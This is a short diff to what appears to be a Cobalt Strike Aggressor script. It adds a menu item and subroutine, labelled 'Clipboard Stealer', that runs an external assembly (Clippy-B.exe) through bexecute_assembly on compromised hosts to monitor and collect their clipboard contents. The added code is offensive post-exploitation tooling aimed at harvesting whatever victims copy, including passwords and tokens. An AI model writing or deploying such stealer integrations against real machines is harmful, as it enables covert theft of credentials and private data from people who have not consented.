@@ -533,7 +533,18 @@ item "Screenshots"{
 			screenshots($bid);
 		}
 	}
+	
 
+#################################################
+#   Clipboard Stealer By jfmaesa
+#################################################
+
+item "Retrieve Clipboard Contents"{
+	local('$bid');
+		foreach $bid ($1){
+			getclippy($bid);
+		}
+	}
 
 #################################################
 
@@ -1123,6 +1134,15 @@ sub screenshots{
     dialog_show($dialog);
 
 }
+
+
+#################################################
+#   Clipboard Stealer By jfmaesa
+#################################################
+sub getclippy{
+bexecute_assembly($1, script_resource("/exe/Clippy-B.exe"),"--interval=10 --monitor=4");
+}
+
 
 #################################################
 
